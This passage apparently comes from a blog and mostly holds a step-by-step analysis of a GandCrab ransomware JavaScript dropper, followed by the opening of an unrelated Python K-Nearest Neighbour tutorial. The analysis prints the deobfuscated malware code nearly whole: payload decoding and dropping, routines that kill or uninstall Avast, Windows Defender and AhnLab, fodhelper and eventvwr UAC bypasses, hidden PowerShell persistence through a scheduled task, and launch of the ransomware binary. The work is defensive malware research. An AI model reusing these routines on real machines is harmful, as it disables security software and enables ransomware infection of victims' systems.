delaywhile (true) { var cpedcxyfdmsl = new Date(); if ((cpedcxyfdmsl - gveyimd) &gt; (942 + 58)) break;}// very lengthly payloadvar layer_one_encrypted_payload = '886.....502';// decrypt the obfuscated payloadvar layer_one_decrypted_payload = layer_one_encrypted_payload.replace(/(\\d{2})/g, function( payload) { return String.fromCharCode(parseInt(payload, 10) + 30);});function exePayload(payload) { (Function(payload)());}// execute the decypted payloadexePayload(layer_one_decrypted_payload); The above de-obfuscation technique is again used by other javascript code with is dropped to kill antivirus softwares. The above code de-obfuscation the first layer of obfuscation and runs the decrypted javascript code. This code is responsible for the following functions : Detect and kill Avast antivirus service Detect and kill Windows Defender service Detect and kill Microsoft Network Realtime Inspection Service Detect and kill Ahnlab v3 internet security Drop and execute GandCrabV5.0.3. The skeleton of the de-obfuscated code is as show below : 123456789101112131415161718192021222324252627282930function decryptAndDrop(ecryptedPayload, outputFileName) { // decrypt and drop the payload}function runShellCommand(shellCommand) { // run shell command}function getServiceStatus(serviceName) { // gets all the service passed in the parameter}if (getServiceStatus('avast! Antivirus')) {// kill Avast antivirus if detected running}if ((getServiceStatus('WdNisSvc')) || (getServiceStatus('WinDefend'))) { // DISABLE Windows Defender if detected running}if (getServiceStatus('NisSrv'))// DISABLE Window antivirus if detected running}if (getServiceStatus('V3 Service')) { // Uninstall Ahnlabs if detected running}// drop and execute GandCrab binary As we progress with the analysis we will see the detail explanation of each functionality, lets start with the basic function with are used used by the first layer of the code: 1234567891011121314151617181920var bewktojmagvc = new ActiveXObject('Scripting.FileSystemObject');var zevdbpspf = WScript.CreateObject(&quot;WScript.Shell&quot;);var malScriptPath = zevdbpspf.ExpandEnvironmentStrings(&quot;%USERPROFILE%&quot;) + &quot;\\\\&quot;;function decryptAndDrop(ecryptedPayload, outputFileName) { // decrypt and drop the payload var ecryptedPayloadClean = ecryptedPayload.split(&quot;&quot;).reverse().join(&quot;&quot;); decyptedPayload = ''; for (i = 0; i &lt; (ecryptedPayloadClean.length / 2); i++) { decyptedPayload += String.fromCharCode('0x' + ecryptedPayloadClean.substr(i * 2, 2)); } var payloadFile = new ActiveXObject(&quot;ADODB.Stream&quot;); payloadFile.Type = 2; payloadFile.Charset = &quot;ISO-8859-1&quot;; payloadFile.Open(); payloadFile.WriteText(decyptedPayload); payloadFile.SaveToFile(outputFileName, 2); payloadFile.Close();} The above function decrypts the payload passed as parameter and drops the file with the name specified in the second parameter. All the output files are drop in USERPROFILE directory. 1234567891011121314151617function runShellCommand(shellCommand) { var osShell = WScript.CreateObject(&quot;WScript.Shell&quot;); var cmdResponse = osShell.Exec(shellCommand); var i = 0; while (true) { if (cmdResponse.Status == 0) { WScript.Sleep(100); i++; } else { break; } if (i == 1800) { cmdResponse.Terminate(); break; } }} The above function runs the shell command as passed as first parameter. If the command was not successful then it goes to sleeps for 100 ms and retries it again. Retries goes on for maximum of 1800 time, if still unsuccessful then it kill this shell. 123456789101112131415function getServiceStatus(serviceName) { // gets all the service passed in the parameter var serviceObj = GetObject(&quot;winmgmts:&quot;).ExecQuery(&quot;SELECT * FROM Win32_Service WHERE Name='&quot; + serviceName + &quot;'&quot;); vaatgfp = new Enumerator(serviceObj); xcabb = vaatgfp.item(); var bfdln = ''; try { bfdln = xcabb.State; } catch (e) {} if (bfdln == 'Running') { return true; } else { return false; }} This function get the status of service, it returns either true or false. The name of the service is passed as parameter to the function. This function is used many time in the script. Killing Avast AntivirusIn the main javascript code first check if the Avast antivirus service is present? if it is. Then it drops and executes the kyoxks.js which is responsible for killing of antivirus. Below is the code with does that : 12345678var pjqssmaj = 'B392....67';if (getServiceStatus('avast! Antivirus')) { decryptAndDrop(pjqssmaj, malScriptPath + 'kyoxks.js'); try { runShellCommand('wscript.exe &quot;' + malScriptPath + 'kyoxks.js&quot;'); } catch (e) {} WScript.sleep(15000);} The decrypted script kyoxks.js as shown below: 12345678910111213141516var windowsShell = WScript.CreateObject(&quot;shell.application&quot;);var ligslo = new ActiveXObject(&quot;WScript.Shell&quot;);var mirzgxodyv = GetObject(&quot;winmgmts:\\\\\\\\.\\\\root\\\\CIMV2&quot;);var xuzvgzuuqvg = mirzgxodyv.ExecQuery(&quot;SELECT * FROM Win32_OperatingSystem&quot;, &quot;WQL&quot;, 0x10 | 0x20);var cruijgvvr = new Enumerator(xuzvgzuuqvg);var vzryitg = cruijgvvr.item();var htklccofp = vzryitg.SystemDirectory;var fllijjwjsw = vzryitg.Version;var arr = fllijjwjsw.split(&quot;.&quot;);// lengthy Base64 encoded powershell payloadvar nfdmkk = '[System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String(&quot;JABhAD.....sAfQA=&quot;)) | Invoke-Expression';ligslo.RegWrite(&quot;HKEY_CURRENT_USER\\\\SOFTWARE\\\\ycsdrr\\\\pvrylqzhlnv&quot;, nfdmkk, &quot;REG_SZ&quot;);var kolhp = 'powershell -windowstyle hidden -command &quot;(Get-ItemProperty -path HKCU:\\\\\\\\SOFTWARE\\\\\\\\ycsdrr).pvrylqzhlnv | Invoke-\\'\\'Expression\\\\\\\\\\\\&quot;'; The function of the above script is : Write Base64 encoded Unicode PowerShell scripting code to the registry key. This PowerShell code will be scheduled to run at regular interval in the later part of the script. The corresponding registry key is HKEY_CURRENT_USER\\SOFTWARE\\ycsdrr\\pvrylqzhlnv. After writing the above PowerShell command code to the registry it schedules it to run it regularly. The variable nfdmkk is a base64 encoded Unicode String above, and decoded sting it is as follows: 123456789101112131415161718192021$a1 = $env: temp;$a1 = $a1 + '\\_av_iup.tm~a01\\';$a2 = (Get - Process - Name AvastUI) | Split - Path;if(Test-Path -Path $a2 ){ if(!(Test-Path -Path $a1 )){ New-Item -ItemType directory -Path $a1; Copy-Item $a2'setup prod - pgm.vpx ' -Destination $a1; Copy-Item $a2'setup products.def ' -Destination $a1; Copy-Item $a2'setup uat.vpx ' -Destination $a1; Copy-Item $a2'setup HTMLayout.dll ' -Destination $a1; Copy-Item $a2'setup part - prg_ais - 1206092 d.vpx ' -Destination $a1; Copy-Item $a2'setup part - setup_ais - 1206092 d.vpx ' -Destination $a1; $a3 = $a2 + 'setup instup.exe '; $a4 = '/prod:ais /sfx:clear /sfxstorage:&quot;'+$a1+'&quot; /wait '; start-process $a3 $a4 }}Add-Type &quot;a c# code showed in next section&quot;; The Powershell script above does the following function: Copy the corresponding software files to the temporary directory. Find and start the Avast update program. Clear the cached data. Interesting powershell script also adds a type with Add-Type, which is the c# code which is as shown below. 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081using System;using System.Runtime.InteropServices;using System.Collections.Generic;using System.Text;public class a12 { [return: MarshalAs(UnmanagedType.Bool)] [DllImport(&quot;&quot;user32.dll&quot;&quot;, SetLastError = true, CharSet = CharSet.Auto)] static extern bool PostMessage(IntPtr a15, uint Msg, IntPtr wParam, IntPtr lParam); [DllImport(&quot;&quot;user32.dll&quot;&quot;, EntryPoint = &quot;&quot;FindWindowEx&quot;&quot;, CharSet = CharSet.Auto)] static extern IntPtr FindWindowEx(IntPtr a15Parent, IntPtr a15ChildAfter, string lpszClass, string lpszWindow); [DllImport(&quot;&quot;user32.dll&quot;&quot;)] [return: MarshalAs(UnmanagedType.Bool)] public static extern bool IsWindowVisible(IntPtr a15); [DllImport(&quot;&quot;user32.dll&quot;&quot;, SetLastError = true)] static extern uint GetWindowThreadProcessId(IntPtr a15, out uint lpdwProcessId); [DllImport(&quot;&quot;user32.dll&quot;&quot;)] public static extern bool ShowWindow(IntPtr a15, Int32 nCmdShow); public static IntPtr a10(string windowTitle, int ProcessID) { IntPtr retIntPtr = IntPtr.Zero; int maxCount = 9999; int ct = 0; IntPtr prevChild = IntPtr.Zero; IntPtr currChild = IntPtr.Zero; while(true &amp;&amp; ct &lt; maxCount) { currChild = FindWindowEx(IntPtr.Zero, prevChild, null, null); if (currChild == IntPtr.Zero) break; if (IsWindowVisible(currChild)) { uint procID = 0; GetWindowThreadProcessId(currChild, out procID); if (procID == ProcessID) { retIntPtr = currChild; break; } } prevChild = currChild; ++ct; } return retIntPtr; } public static void a13(int a15) { PostMessage(new IntPtr(a15), 0x0100, new IntPtr(0x09), new IntPtr(0)); PostMessage(new IntPtr(a15), 0x0100, new IntPtr(0x20), new IntPtr(0)); PostMessage(new IntPtr(a15), 0x0101, new IntPtr(0x20), new IntPtr(0)); ShowWindow(new IntPtr(a15), 0); } public static void a11(int a15) { PostMessage(new IntPtr(a15), 0x0100, new IntPtr(0x09), new IntPtr(0)); PostMessage(new IntPtr(a15), 0x0101, new IntPtr(0x09), new IntPtr(0)); PostMessage(new IntPtr(a15), 0x0100, new IntPtr(0x09), new IntPtr(0)); PostMessage(new IntPtr(a15), 0x0101, new IntPtr(0x09), new IntPtr(0)); PostMessage(new IntPtr(a15), 0x0100, new IntPtr(0x09), new IntPtr(0)); PostMessage(new IntPtr(a15), 0x0101, new IntPtr(0x09), new IntPtr(0)); PostMessage(new IntPtr(a15), 0x0100, new IntPtr(0x09), new IntPtr(0)); PostMessage(new IntPtr(a15), 0x0101, new IntPtr(0x09), new IntPtr(0)); PostMessage(new IntPtr(a15), 0x0100, new IntPtr(0x09), new IntPtr(0)); PostMessage(new IntPtr(a15), 0x0101, new IntPtr(0x09), new IntPtr(0)); PostMessage(new IntPtr(a15), 0x0100, new IntPtr(0x09), new IntPtr(0)); PostMessage(new IntPtr(a15), 0x0101, new IntPtr(0x09), new IntPtr(0)); PostMessage(new IntPtr(a15), 0x0100, new IntPtr(0x09), new IntPtr(0)); PostMessage(new IntPtr(a15), 0x0101, new IntPtr(0x09), new IntPtr(0)); PostMessage(new IntPtr(a15), 0x0100, new IntPtr(0x09), new IntPtr(0)); PostMessage(new IntPtr(a15), 0x0101, new IntPtr(0x09), new IntPtr(0)); PostMessage(new IntPtr(a15), 0x0100, new IntPtr(0x09), new IntPtr(0)); PostMessage(new IntPtr(a15), 0x0101, new IntPtr(0x09), new IntPtr(0)); PostMessage(new IntPtr(a15), 0x0100, new IntPtr(0x09), new IntPtr(0)); PostMessage(new IntPtr(a15), 0x0101, new IntPtr(0x09), new IntPtr(0)); PostMessage(new IntPtr(a15), 0x0100, new IntPtr(0x09), new IntPtr(0)); PostMessage(new IntPtr(a15), 0x0101, new IntPtr(0x09), new IntPtr(0)); PostMessage(new IntPtr(a15), 0x0100, new IntPtr(0x20), new IntPtr(0)); PostMessage(new IntPtr(a15), 0x0101, new IntPtr(0x20), new IntPtr(0)); ShowWindow(new IntPtr(a15), 0); } public static void a14(int a15) { ShowWindow(new IntPtr(a15), 0); }} The above code find the Avast Updater window process ID and Send the appropriate message with a11 a14 or a13 function using windows ShowWindow method. In continuation with the above powershell script is the below script with Traverse the Avast updater process using the c# code which was just added. 123456789101112131415161718192021$a6 = 0;$a7 = 0;While ($a -le 5) { $a8 = Get-Process &quot;instup&quot;; $a9 = [a12]::a10(&quot;&quot;,$a8.Id); If ([a12]::IsWindowVisible($a9)) { if ($a7 -eq 1) { [a12]::a11($a9); $a7=2; } if ($a7 -eq 0) { [a12]::a13($a9); $a7=1; } if ($a7 -eq 2) { [a12]::a11($a9); [a12]::a14($a9) } } Start-Sleep -seconds 1;} Next in continuation with avast killing javascript is the code shown below : 12345678910111213141516171819202122232425var fqhqkxq = 'powershell -ExecutionPolicy By\\\\\\\\\\\\&quot;\\\\\\\\\\\\&quot;Pass -windowstyle hi\\\\\\\\\\\\&quot;\\\\\\\\\\\\&quot;dd\\\\\\\\\\\\&quot;\\\\\\\\\\\\&quot;en -command \\\\\\\\\\\\&quot;(Get-ItemProperty -path HKCU:\\\\\\\\SOFTWARE\\\\\\\\ycsdrr).pvrylqzhlnv | Invoke-\\'\\'Expression\\\\\\\\\\\\&quot;';if (arr[0] == '10') { windowsShell.ShellExecute(&quot;powershell.exe&quot;, 'New-Item \\'HKCU:\\\\Software\\\\Classes\\\\exefile\\\\shell\\\\open\\\\command\\\\\\' -Force | New-ItemProperty -Name \\'(Default)\\' -Value \\'schtasks /Create /SC DAILY /TN \\\\&quot;lqesuuz\\\\&quot; /RL Highest /TR \\\\&quot;' + kolhp + '\\\\&quot; /ST 05:12\\' -PropertyType string -Force | Out-Null ; Start-Process \\'slui.exe\\' -Verb RunAs -Wait; Remove-Item -Path \\'HKCU:\\\\Software\\\\Classes\\\\exefile\\\\\\' -Force -Recurse; Start-Sleep -s 1; Start-ScheduledTask \\'lqesuuz\\'', &quot;&quot;, &quot;open&quot;, 0);} else { if (arr[0] == '6') { windowsShell.ShellExecute(&quot;powershell.exe&quot;, 'New-Item \\'HKCU:\\\\Software\\\\Classes\\\\mscfile\\\\shell\\\\open\\\\command\\\\\\' -Force | New-ItemProperty -Name \\'(Default)\\' -Value \\'schtasks /Create /SC DAILY /TN \\\\&quot;lqesuuz\\\\&quot; /RL Highest /TR \\\\&quot;' + fqhqkxq + '\\\\&quot; /ST 05:12\\' -PropertyType string -Force | Out-Null ; Start-Process \\'CompMgmtLauncher.exe\\' -Verb RunAs -Wait; Start-Sleep -s 5; Remove-Item -Path \\'HKCU:\\\\Software\\\\Classes\\\\mscfile\\\\\\' -Force -Recurse; Start-Process \\'schtasks\\' \\'/run /TN \\\\&quot;lqesuuz\\\\&quot;\\'', &quot;&quot;, &quot;open&quot;, 0); }}var counter = 0;while (true) { if (getServiceStatus('avast! Antivirus')) { WScript.sleep(100); } else { WScript.sleep(5000); break; } counter = counter + 1; if (counter == 1800) { break; }} Its function is to create a scheduled task named as lqesuuz and execute it through PowerShell. Following are the task which are execute the above code through the scheduled task : schtasks /Create /SC DAILY /TN \\“lqesuuz\\“ /RL Highest /TR \\“powershell -windowstyle hidden -command “(Get-ItemProperty -path HKCU:\\\\SOFTWARE\\\\ycsdrr).pvrylqzhlnv\\“ /ST 05:12 *schtasks /Create /SC DAILY /TN \\“lqesuuz\\“ /RL Highest /TR \\“powershell -ExecutionPolicy ByPass -windowstyle hidden -command “(Get-ItemProperty -path HKCU:\\SOFTWARE\\ycsdrr).pvrylqzhlnv\\“ /ST 05:12* To understand what the above command does here is some command reference for Microsoft documentation : Command Description /SC schedule A value that specifies the schedule frequency. Valid values are: MINUTE, HOURLY, DAILY, so on /TN taskname name of task /RL level A value that sets the run level for the task. Valid values are LIMITED and HIGHEST. The default is LIMITED. /TR taskrun A value that specifies the path and file name of the task to be run at the scheduled time /ST starttime A value that specifies the start time to run the task. The time format is HH:mm (24-hour time) Killing Windows DefenderIf it detects that the system service contains WdNisSvc or WinDefend services with following code : 1234567var wvspotnpwm = 'B39266B....667';if ((getServiceStatus('WdNisSvc')) || (getServiceStatus('WinDefend'))) { decryptAndDrop(wvspotnpwm, malScriptPath + 'nykvwcajm.js'); try { runShellCommand('wscript.exe &quot;' + malScriptPath + 'nykvwcajm.js&quot;'); } catch (e) {}} It generates and executes the nykvwcajm.js script, which on decryption is as follows: 12345678910111213141516171819202122232425262728293031323334353637serviceName = '';if (getServiceStatus('WdNisSvc')) { serviceName = 'WdNisSvc';} else { if (getServiceStatus('WinDefend')) { serviceName = 'WinDefend'; }}var amdiac = WScript.CreateObject(&quot;shell.application&quot;);var zlrvcjg = new ActiveXObject(&quot;WScript.Shell&quot;);var dhqjbo = GetObject(&quot;winmgmts:\\\\\\\\.\\\\root\\\\CIMV2&quot;);var qpoyqecprmfq = dhqjbo.ExecQuery(&quot;SELECT * FROM Win32_OperatingSystem&quot;, &quot;WQL&quot;, 0x10 | 0x20);var kscpive = new Enumerator(qpoyqecprmfq);var zrtkekm = kscpive.item();var llkxvhpslfqw = zrtkekm.SystemDirectory;var tamrvhtepo = zrtkekm.Version;var arr = tamrvhtepo.split(&quot;.&quot;);if (arr[0] == '10') { zlrvcjg.RegWrite(&quot;HKEY_CURRENT_USER\\\\Software\\\\Classes\\\\ms-settings\\\\shell\\\\open\\\\command\\\\&quot;, 'cmd.exe /C &quot;powershell Set-MpPreference -DisableRealtimeMonitoring $true &amp;&amp; taskkill /im MSASCui* /f /t&quot;', &quot;REG_SZ&quot;); zlrvcjg.RegWrite(&quot;HKEY_CURRENT_USER\\\\Software\\\\Classes\\\\ms-settings\\\\shell\\\\open\\\\command\\\\DelegateExecute&quot;, &quot;&quot;, &quot;REG_SZ&quot;); amdiac.ShellExecute(llkxvhpslfqw + &quot;\\\\fodhelper.exe&quot;, &quot;&quot;, &quot;&quot;, &quot;open&quot;, 0); WScript.sleep(2000); amdiac.MinimizeAll(); zlrvcjg.RegDelete(&quot;HKEY_CURRENT_USER\\\\Software\\\\Classes\\\\ms-settings\\\\shell\\\\open\\\\command\\\\&quot;);} else { if (arr[0] == '6') { zlrvcjg.RegWrite(&quot;HKEY_CURRENT_USER\\\\Software\\\\Classes\\\\mscfile\\\\shell\\\\open\\\\command\\\\&quot;, 'cmd.exe /C &quot;sc stop WinDefend &amp;&amp; taskkill /im MSASCui* /f /t&quot;', &quot;REG_SZ&quot;); amdiac.ShellExecute(llkxvhpslfqw + &quot;\\\\eventvwr.exe&quot;, &quot;&quot;, &quot;&quot;, &quot;open&quot;, 0); WScript.sleep(2000); zlrvcjg.RegDelete(&quot;HKEY_CURRENT_USER\\\\Software\\\\Classes\\\\mscfile\\\\shell\\\\open\\\\command\\\\&quot;); }} The above script does the following : Decrypt the corresponding JS script content. Tries to detect if WdNisSvc or WinDefend service is running. Then it tries to determine the version of the operating system and executes the command based on the OS version. If its windows 10 then it does following : It write the command cmd.exe /C “powershell Set-MpPreference -DisableRealtimeMonitoring $true &amp;&amp; taskkill /im MSASCui /f /t cmd. Exe /C “sc stop WinDefend &amp;&amp; taskkill /im MSASCui /f /t to registry key. The corresponding registry key is *HKEY_CURRENT_USER\\Software\\Classes\\ms-settings\\shell\\open\\command*. The purpose of the command is to disable the Windows Defender. It sets the registry key HKEY_CURRENT_USER\\Software\\Classes\\ms-settings\\shell\\open\\command\\DelegateExecute value to blank. Execute fodhelper.exe this is the binary which read the command from the registry key and executes the command at high privilege. sleeps for 2 secs and then deletes the same *HKEY_CURRENT_USER\\Software\\Classes\\ms-settings\\shell\\open\\command* registry key. If the Version detected is 6(for Windows 7 and above) in that case it will do the following : It write the command cmd.exe /C “sc stop WinDefend &amp;&amp; taskkill /im MSASCui /f /t”* to registry key. The corresponding registry key is *HKEY_CURRENT_USER\\Software\\Classes\\mscfile\\shell\\open\\command* The purpose of the command is to disable the Windows Defender. Execute eventvwr.exe this is the binary which read the command from the registry key and executes the command at high privilege. sleeps for 2 secs and then deletes the same *HKEY_CURRENT_USER\\Software\\Classes\\mscfile\\shell\\open\\command* registry key. When is say windows 7 and above it means following Operating System: Windows Vista Windows 7 Windows 8 Windows 8.1 What the above script is tying to achieve is the get privilege escalation and then disable the windows Defender service. To read more about this vulnerability on the Windows UAC bypass check the blogs below : Window 10 UAC Bypass Window 7 and above UAC Bypass Kill Microsoft Network Realtime Inspection ServiceThis below snippet in the main javascript file tries to detect if the Microsoft NisSrv service is running.NIsSrv stands for Microsoft Network Realtime Inspection Service its a microsoft antivirus service starts at Windows boot time, implementing the Network Inspection Service. If it detect this service running then it drop and execute bervcptyvulur.js file. 1234567var hoszxms = 'B3926...667';if (getServiceStatus('NisSrv')) { decryptAndDrop(hoszxms, malScriptPath + 'bervcptyvulur.js'); try { runShellCommand('wscript.exe &quot;' + malScriptPath + 'bervcptyvulur.js&quot;'); } catch (e) {}} bervcptyvulur.js file is when decrypted it should look as follows: 1234567891011121314151617181920212223242526272829var sxwvah = WScript.CreateObject(&quot;shell.application&quot;);var siwbezkij = new ActiveXObject(&quot;WScript.Shell&quot;);var fufajgarmx = GetObject(&quot;winmgmts:\\\\\\\\.\\\\root\\\\CIMV2&quot;);var lsiicx = fufajgarmx.ExecQuery(&quot;SELECT * FROM Win32_OperatingSystem&quot;, &quot;WQL&quot;, 0x10 | 0x20);var zynhqkeg = new Enumerator(lsiicx);var iaibbfhyncgmgt = zynhqkeg.item();var vjcrmmpy = iaibbfhyncgmgt.SystemDirectory;var nimlctvre = iaibbfhyncgmgt.Version;var arr = nimlctvre.split(&quot;.&quot;);if (arr[0] == '10') { siwbezkij.RegWrite(&quot;HKEY_CURRENT_USER\\\\Software\\\\Classes\\\\ms-settings\\\\shell\\\\open\\\\command\\\\&quot;, 'MsiExec.exe /X{2AA3C13E-0531-41B8-AE48-AE28C940A809} ACCEPT=YES /qr+ /quiet', &quot;REG_SZ&quot;); siwbezkij.RegWrite(&quot;HKEY_CURRENT_USER\\\\Software\\\\Classes\\\\ms-settings\\\\shell\\\\open\\\\command\\\\DelegateExecute&quot;, &quot;&quot;, &quot;REG_SZ&quot;); sxwvah.ShellExecute(&quot;explorer.exe&quot;, '&quot;' + vjcrmmpy + '\\\\fodhelper.exe&quot;', &quot;&quot;, &quot;open&quot;, 0); WScript.sleep(10000); siwbezkij.RegDelete(&quot;HKEY_CURRENT_USER\\\\Software\\\\Classes\\\\ms-settings\\\\shell\\\\open\\\\command\\\\&quot;);} else { if (arr[0] == '6') { siwbezkij.RegWrite(&quot;HKEY_CURRENT_USER\\\\Software\\\\Classes\\\\mscfile\\\\shell\\\\open\\\\command\\\\&quot;, 'MsiExec.exe /X {2AA3C13E-0531-41B8-AE48-AE28C940A809} ACCEPT=YES /qr+ /quiet', &quot;REG_SZ&quot;); sxwvah.ShellExecute(&quot;explorer.exe&quot;, '&quot;' + vjcrmmpy + '\\\\eventvwr.exe&quot;', &quot;&quot;, &quot;open&quot;, 0); WScript.sleep(10000); siwbezkij.RegDelete(&quot;HKEY_CURRENT_USER\\\\Software\\\\Classes\\\\mscfile\\\\shell\\\\open\\\\command\\\\&quot;); }} This above script uses the same method for privilage escalation with the difference been the command been execute which are as follows : MsiExec.exe /X{2AA3C13E-0531-41B8-AE48-AE28C940A809} ACCEPT=YES /qr+ /quiet for Window 10 MsiExec.exe /X {2AA3C13E-0531-41B8-AE48-AE28C940A809} ACCEPT=YES /qr+ /quiet for Window7 and above. Kill Ahnlab AntivirusIf the code detects system running V3 Service then the below code runs. It decrypts and drops a file called recjyzcz.js this file is only dropped only if tgydmilslvp.txt is already present on %USERPROFILE% path otherwise it will drops the file tgydmilslvp.txt that contains value 777. 1234567891011121314151617var fileSystemObject = new ActiveXObject('Scripting.FileSystemObject');if (getServiceStatus('V3 Service')) { var mvqwaqu = 'B39...667'; if (fileSystemObject.FileExists(malScriptPath + &quot;tgydmilslvp.txt&quot;)) { decryptAndDrop(mvqwaqu, malScriptPath + 'recjyzcz.js'); try { runShellCommand('wscript.exe &quot;' + malScriptPath + 'recjyzcz.js&quot;'); } catch (e) {} } else { decryptAndDrop('727272', malScriptPath + 'tgydmilslvp.txt'); try { runShellCommand('wscript.exe &quot;' + WScript.ScriptFullName + '&quot;'); } catch (e) {} WScript.Quit(); }} When the file recjyzcz.js is decrypted and dropped it look as below : 1234567891011121314151617181920212223242526272829303132333435var shellObject = WScript.CreateObject(&quot;shell.application&quot;);var wScriptObject = new ActiveXObject(&quot;WScript.Shell&quot;);var mtvunslh = GetObject(&quot;winmgmts:\\\\\\\\.\\\\root\\\\CIMV2&quot;);var hewjay = mtvunslh.ExecQuery(&quot;SELECT * FROM Win32_OperatingSystem&quot;, &quot;WQL&quot;, 0x10 | 0x20);var yhqpykwg = new Enumerator(hewjay);var yjiofgrdfx = yhqpykwg.item();var systemDirectoryPath = yjiofgrdfx.SystemDirectory;var OSVersionStr = yjiofgrdfx.Version;var OSVersion = OSVersionStr.split(&quot;.&quot;);// base64 encoded unicode stringvar zrynfhnwsub = 'QQBk...H0A';wScriptObject.RegWrite(&quot;HKEY_CURRENT_USER\\\\Software\\\\capvzgf\\\\cazysa&quot;, zrynfhnwsub, &quot;REG_SZ&quot;);// long unicode encoded strings when decoded looks like below// (Get-ItemProperty -path 'HKCU:\\SOFTWARE\\capvzgf').cazysavar djziapwzi = systemDirectoryPath + '\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe -nologo -noprofile -ExecutionPolicy ByPass -w hidden -EncodedCommand WwB.....AA==';if (OSVersion[0] == '10') { wScriptObject.RegWrite(&quot;HKEY_CURRENT_USER\\\\Software\\\\Classes\\\\ms-settings\\\\shell\\\\open\\\\command\\\\&quot;, djziapwzi, &quot;REG_SZ&quot;); wScriptObject.RegWrite(&quot;HKEY_CURRENT_USER\\\\Software\\\\Classes\\\\ms-settings\\\\shell\\\\open\\\\command\\\\DelegateExecute&quot;, &quot;&quot;, &quot;REG_SZ&quot;); shellObject.ShellExecute(&quot;explorer.exe&quot;, '&quot;' + systemDirectoryPath + '\\\\fodhelper.exe&quot;', &quot;&quot;, &quot;open&quot;, 0); WScript.sleep(5000); wScriptObject.RegDelete(&quot;HKEY_CURRENT_USER\\\\Software\\\\Classes\\\\ms-settings\\\\shell\\\\open\\\\command\\\\&quot;);} else { if (OSVersion[0] == '6') { wScriptObject.RegWrite(&quot;HKEY_CURRENT_USER\\\\Software\\\\Classes\\\\mscfile\\\\shell\\\\open\\\\command\\\\&quot;, djziapwzi, &quot;REG_SZ&quot;); shellObject.ShellExecute(&quot;explorer.exe&quot;, '&quot;' + systemDirectoryPath + '\\\\eventvwr.exe&quot;', &quot;&quot;, &quot;open&quot;, 0); WScript.sleep(5000); wScriptObject.RegDelete(&quot;HKEY_CURRENT_USER\\\\Software\\\\Classes\\\\mscfile\\\\shell\\\\open\\\\command\\\\&quot;); }} The above script follows the same pattern as previous scripts it writes a PowerShell script to registry key HKEY_CURRENT_USER\\Software\\capvzgf\\cazysa and then use the same privilage escalation method as described in the previous section to execute that PowerShell script at high privilage. The PowerShell script is base64 encoded unicode string, on decoding the script is as shown below. 12345678910111213141516171819202122232425262728Add-Type ' c# code show in next section';$a1=(Get-Process -Name V3Lite).path | Split-Path;$a2 = $a1+'\\Uninst.exe';if([System.IO.File]::Exists($a2)){ $a5 = $ENV:UserProfile+'\\Desktop\\install.exe'; $a6 = &quot;C:\\Windows\\System32\\cmd.exe&quot;; Copy-Item $a2 -Destination $a5; $a3 = '/c &quot;runas /trustlevel:0x40000 ^&quot;'+$a5+' -Uninstall^&quot; &amp; ^&quot;%TEMP%\\AhnUn000.tmp^&quot; -UC&quot;'; start-process $a6 $a3 -WindowStyle Hidden; $a7 = '/c &quot;runas /trustlevel:0x40000 ^&quot;%TEMP%\\AhnUn000.tmp -UC^&quot;&quot;'; Start-Sleep -seconds 5; start-process $a6 $a7 -WindowStyle Hidden; $a = 0; While ($a -le 5) { Start-Sleep -s 1; $a4 = Get-Process &quot;AhnUn000.tmp&quot;; if ($a4) { if([int]$a4.MainWindowHandle -eq 0) { Start-Sleep -seconds 1 } [WindowHelper]::SendKeysMe($a4.MainWindowHandle) } }} The above script run the following commands at elevated privilages : **C:\\Windows\\System32\\cmd.exe /c “runas /trustlevel:0x40000 \\Desktop\\install.exe -Uninstall” &amp; “%TEMP%\\AhnUn000.tmp” -UC ** C:\\Windows\\System32\\cmd.exe /c “runas /trustlevel:0x40000 %TEMP%\\AhnUn000.tmp” -UC What its doing is uninstalling the Ahnlab antivirus. 1234567891011121314151617181920212223242526using System;using System.Runtime.InteropServices;public class WindowHelper { [DllImport(&quot;user32.dll&quot;, SetLastError = true, CharSet = CharSet.Auto)] static extern bool PostMessage( IntPtr hWnd, uint Msg, IntPtr wParam, IntPtr lParam); [return : MarshalAs(UnmanagedType.Bool)] [DllImport(&quot;user32.dll&quot;)] public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow); const Int32 WM_KEYDOWN = 0x0100; const Int32 VK_RETURN = 0x0D; public static void SendKeysMe(int hWnd) { PostMessage(new IntPtr(hWnd), WM_KEYDOWN, new IntPtr(VK_RETURN), new IntPtr(0)); ShowWindow(new IntPtr(hWnd), 0); }} Drop and execute GandCrab binaryOnce the environment is set properly i.e. removing security products the javascript file drops and executes the malware binary leading to system encryption, code to drop binary is as shown below. 123456789101112var stwnydqsuji = WScript.CreateObject(&quot;shell.application&quot;);var bewktojmagvc = new ActiveXObject('Scripting.FileSystemObject');var xtaqukamdxzx = '0000....5D4';decryptAndDrop(xtaqukamdxzx, malScriptPath + 'dsoyaltj.exe');if (bewktojmagvc.FileExists(malScriptPath + &quot;dsoyaltj.exe&quot;)) { try { stwnydqsuji.ShellExecute('&quot;' + malScriptPath + &quot;dsoyaltj.exe&quot; + '&quot;', '', &quot;&quot;, &quot;open&quot;, 1); } catch (e) {}} MD5 File 595A31A4913951D3EB7211618AE75DEA javascript dropper 95557A29DE4B70A25CE62A03472BE684 binary file source code of all the analysis can be found on this link References PowerShell Add-Type What is NisSrv.exe Window 10 UAC Bypass Window 7 and 8 UAC Bypass","link":"/2018/10/18/gandcrab-detail-analysis-of-js-delivery-payload/"},{"title":"Implementing K-NearestNeighbour algorithm from scratch in python","text":"K-Nearest Neighbour is the simplest of machine learning algorithms which can be very effective in some cases. The objective of the post it to implement it from scratch in python, you need to know a fair bit of python for and a little bit of numpy for the faster version of the algorithm. Once we have implemented the algorithm we will also see how to improve the performance of the algorithm. As there is no single invincible algorithm, we will look into advantage/disadvantage of the algorithm, this will help us to decide on when to use the algorithm. Alright, then let’s get straight into it. What is K-Nearest Neighbour Algorithm (KNN)?KNN is a supervised learning algorithm it means we need some label training data to use the algorithm. KNN is also called non-parametric algorithm as it makes no explicit assumption about the form of data, unlike any other parametric machine learning algorithm it does not have to estimate any parameter like the linear regression for it to work. It is also a lazy algorithm as the algorithm doesn’t run until you have to make the prediction. In a typical machine learning algorithm, we are trying to predict the certain outcome base on data points (ML folks call it features). For example, if we are trying to predict the type of Iris flower based on petal height, width and sepal height, width. So we have 4 feature here and we are trying to classify the type of iris flower(assuming its a classification problem). If we plot feature on the graph and when we have to make the prediction for a data point, we try to find the nearest K data point and take the average value of the outcomes of those nearest data points.We can use KNN for both regression and classification problem. They both 